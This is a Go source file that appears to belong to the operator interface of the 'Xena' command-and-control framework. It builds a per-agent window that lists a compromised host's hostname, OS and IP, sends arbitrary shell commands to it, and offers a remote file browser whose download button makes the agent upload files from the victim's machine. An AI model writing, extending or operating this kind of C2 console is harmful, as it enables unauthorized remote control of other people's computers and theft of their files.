package views

import (
	"bytes"
	"encoding/json"
	"fmt"
	"image/png"
	"runtime"
	"strings"
	"time"
	"ui/core"
	"ui/effects"
	"ui/static"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/data/binding"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
	"github.com/google/uuid"
	xenaC2 "github.com/zarkones/xena-client"
)

const AGENT_WINDOW_WIDTH = 960
const AGENT_WINDOW_HEIGHT = 640
const FILES_DIR = "xenalang-scripts"

type ModifiedRichText struct {
	fyne.Container
	Node *widget.RichText
}

func (mv *ModifiedRichText) Tapped(e *fyne.PointEvent) {
	menuItems := make([]*fyne.MenuItem, 1)
	menuItems[0] = fyne.NewMenuItem("Copy", func() {
	})
	m := fyne.NewMenu(
		"MSG_MENU",
		menuItems...,
	)
	widget.ShowPopUpMenuAtPosition(
		m,
		fyne.CurrentApp().Driver().CanvasForObject(mv),
		e.AbsolutePosition,
	)
}

func AgentWindow(agent xenaC2.Agent) {
	w := core.App.NewWindow("XENA: " + agent.Hostname)
	w.Resize(fyne.NewSize(AGENT_WINDOW_WIDTH, AGENT_WINDOW_HEIGHT))
	w.CenterOnScreen()

	w.SetContent(AgentDisplay(agent, &w))

	w.Show()
}

func AgentDisplay(agent xenaC2.Agent, w *fyne.Window) fyne.CanvasObject {
	cmdInput := widget.NewEntry()
	cmdInput.SetPlaceHolder("Enter Command Here")

	var messages []xenaC2.Message

	messagesTxt := widget.NewRichText()
	messagesTxt.Wrapping = fyne.TextWrapWord

	messagesTxtScroll := container.NewVScroll(messagesTxt)

	lastMsgsCount := 0
	updatedOnRespID := ""
	updateMsg := func() {
		messages, _ = xenaC2.FetchMessages(agent.ID)

		messagesTxt.Segments = make([]widget.RichTextSegment, len(messages)*2)

		i := 0
		for _, msg := range messages {
			txt := msg.Request
			if len(msg.FriendlyTitle) != 0 {
				txt = msg.FriendlyTitle
			}

			messagesTxt.Segments[i] = &widget.TextSegment{
				Style: widget.RichTextStyleSubHeading,
				Text:  "_> " + txt,
			}
			i++

			respTxt := msg.Response
			if msg.Request == "/ls" {
				respTxt = "[serialized list of file records, raw json not displayed]"
			}

			messagesTxt.Segments[i] = &widget.TextSegment{
				Style: widget.RichTextStyleCodeInline,
				Text:  respTxt + "\n",
			}
			i++
		}

		// Scroll to bottom if latest message got a response.
		if len(messages) != 0 && messages[len(messages)-1].ID != updatedOnRespID && len(messages[len(messages)-1].Response) != 0 {
			updatedOnRespID = messages[len(messages)-1].ID
			messagesTxt.Refresh()
			messagesTxtScroll.ScrollToBottom()
		} else {
			// Don't refresh the messages text if no new messages are present and no response was received to the latest message.
			if lastMsgsCount != len(messages) {
				messagesTxt.Refresh()
			}
		}
		// Scroll to bottom if there is new message.
		if lastMsgsCount != len(messages) {
			messagesTxtScroll.ScrollToBottom()
			lastMsgsCount = len(messages)
		}
	}

	agentFileSystemBtn := widget.NewButtonWithIcon("FILE BROWSER", theme.FolderOpenIcon(), func() {
		if agent.ID == "" {
			Alert("exception: Agent ID Empty")
			return
		}

		fileBrowserOpen := true

		w := core.App.NewWindow("XENA: File Browser: " + agent.Hostname)
		w.Resize(fyne.NewSize(AGENT_WINDOW_WIDTH/2, AGENT_WINDOW_HEIGHT/2))
		w.CenterOnScreen()
		w.SetCloseIntercept(func() {
			fileBrowserOpen = false
			w.Close()
		})

		fbCtx := xenaC2.FileBrowserCtx{
			Records: []xenaC2.FileRecord{},
		}

		infoData := binding.NewString()
		infoData.Set("Loading...")
		infoLabel := widget.NewLabelWithData(infoData)

		wdData := binding.NewString()
		wdData.Set("")
		wdLabel := widget.NewLabelWithData(wdData)

		prevDir := ""

		changeDir := func(absolutePath string) error {
			defer updateMsg()

			wdData.Set(absolutePath)

			infoData.Set("Loading...")

			newMsg := xenaC2.Message{
				ID:      uuid.New().String(),
				AgentID: agent.ID,
				Request: "/cd:" + absolutePath,
			}

			if err := xenaC2.InsertMessage(newMsg); err != nil {
				Alert("Failed To Send Message, exception:" + err.Error())
				return err
			}

			newMsg = xenaC2.Message{
				ID:      uuid.New().String(),
				AgentID: agent.ID,
				Request: "/ls",
			}

			if err := xenaC2.InsertMessage(newMsg); err != nil {
				Alert("Failed To Send Message, exception:" + err.Error())
				return err
			}

			return nil
		}

		recordsTable := container.NewVBox()

		go func() {
			newMsg := xenaC2.Message{
				ID:      uuid.New().String(),
				AgentID: agent.ID,
				Request: "/ls",
			}

			if err := xenaC2.InsertMessage(newMsg); err != nil {
				Alert("Failed To Send Message, exception:" + err.Error())
				return
			}

			updateMsg()

			prevLsRespID := ""

			for range time.Tick(time.Second / 2) {
				if !fileBrowserOpen {
					break
				}

				fileBrowserMsg, err := xenaC2.GetMessageByReq(agent.ID, "/ls")
				if err != nil {
					fmt.Println("agent-file-browser: xenaC2.GetMessageByReq failed:", err)
					continue
				}

				if fileBrowserMsg.Response == "" {
					continue
				}

				if fileBrowserMsg.ID == prevLsRespID {
					continue
				}

				if err := json.Unmarshal([]byte(fileBrowserMsg.Response), &fbCtx); err != nil {
					fmt.Println("agent-file-browser: json.Unmarshal failed:", err, "|", fileBrowserMsg.Response)
					continue
				}

				if fbCtx.Err != "" {
					infoData.Set("Error: " + fbCtx.Err)
					continue
				}

				infoDataMsg, _ := infoData.Get()
				if infoDataMsg == "Loading..." {
					infoData.Set("")
				}

				wdData.Set(fbCtx.WorkingDir)

				recordsTable.RemoveAll()

				for _, i := range fbCtx.Records {
					record := i
					icon := theme.FileIcon()
					if record.IsDir {
						icon = theme.FolderIcon()
					}
					row := container.NewHBox(
						widget.NewIcon(icon),
						func() fyne.CanvasObject {
							if record.IsDir {
								return widget.NewButton(record.Name, func() {
									changeDir(record.AbsolutePath)
								})
							}
							return widget.NewLabel(record.Name)
						}(),
						layout.NewSpacer(),
						widget.NewButtonWithIcon("", theme.DownloadIcon(), func() {
							fileRecord, err := xenaC2.RequestFileUpload(agent.ID, record.AbsolutePath)
							if err != nil {
								Warn("Failed to request file upload, exception: " + err.Error())
								return
							}

							newMsg := xenaC2.Message{
								ID:      uuid.New().String(),
								AgentID: agent.ID,
								Request: "/upload:" + fileRecord.ID + ";" + record.AbsolutePath,
							}

							if err := xenaC2.InsertMessage(newMsg); err != nil {
								Alert("Failed To Send Message, exception:" + err.Error())
								return
							}

							infoData.Set("Uploading...")
						}),
					)
					recordsTable.Add(row)
				}

				recordsTable.Refresh()

				prevLsRespID = fileBrowserMsg.ID
			}
		}()

		w.SetContent(container.NewBorder(
			container.NewHBox(
				widget.NewButtonWithIcon("", theme.NavigateBackIcon(), func() {
					workingDir, err := wdData.Get()
					if err != nil {
						fmt.Println("agent-file-browser: wdData.Get():", err)
						return
					}

					delim := "/"
					if runtime.GOOS == "windows" {
						delim = "\\"
					}
					if !strings.Contains(workingDir, delim) {
						return
					}
					prevDir = workingDir
					chunks := strings.Split(workingDir, delim)
					newWD := strings.Join(chunks[:len(chunks)-1], delim)
					changeDir(newWD)
				}),
				widget.NewButtonWithIcon("", theme.NavigateNextIcon(), func() {
					if prevDir == "" {
						infoData.Set("Can't Go Forward")
						return
					}
					changeDir(prevDir)
				}),
				infoLabel,
				layout.NewSpacer(),
				wdLabel,
			),
			nil,
			nil,
			nil,
			container.NewVScroll(recordsTable),
		))
		w.Show()
	})

	sendBtn := widget.NewButtonWithIcon("SEND", theme.MailSendIcon(), func() {
		go func() {
			if cmdInput.Text == "" {
				return
			}

			if agent.ID == "" {
				Alert("exception: Agent ID Empty")
				return
			}

			newMsg := xenaC2.Message{
				ID:      uuid.New().String(),
				AgentID: agent.ID,
				Request: cmdInput.Text,
			}

			if err := xenaC2.InsertMessage(newMsg); err != nil {
				Alert("Failed To Send Message, exception:" + err.Error())
			} else {
				updateMsg()
				cmdInput.SetText("")
			}
		}()
	})

	go func() {
		updateMsg()
		messagesTxtScroll.ScrollToBottom()
		for range time.Tick(time.Second * 4) {
			updateMsg()
		}
	}()

	// inspector := ToolsInspector()
	// toolsTable := NewToolsTable(agent, &inspector)

	img, _ := png.Decode(bytes.NewReader(static.XenaAvatar))
	avatar := canvas.NewImageFromImage(img)
	avatar.FillMode = canvas.ImageFillOriginal

	return container.NewBorder(
		// Top.
		effects.Gradient(
			container.NewHBox(
				avatar,
				widget.NewLabel("Hostname: "+agent.Hostname),
				widget.NewLabel("OS: "+agent.OS+" "+agent.Arch),
				widget.NewLabel("IP: "+agent.IpAddress),
			),
			true,
			true,
		),

		// Bottom.
		nil,

		// Left.
		nil,

		// Right.
		nil,

		// Primary.
		// container.NewVSplit(
		// 	container.NewHSplit(
		// 		effects.Gradient(toolsTable, true, false),
		// 		effects.Gradient(container.NewVScroll(&inspector), true, true),
		// 	),

		container.NewBorder(
			// Top.
			nil,

			// Bottom.
			cmdInput,

			// Left.
			nil,

			// Right.
			effects.Gradient(
				container.NewVBox(layout.NewSpacer(), agentFileSystemBtn, sendBtn),
				false,
				true,
			),

			// Primary.
			effects.Gradient(
				messagesTxtScroll,
				false,
				true,
			),
			// ),
		),
	)
}
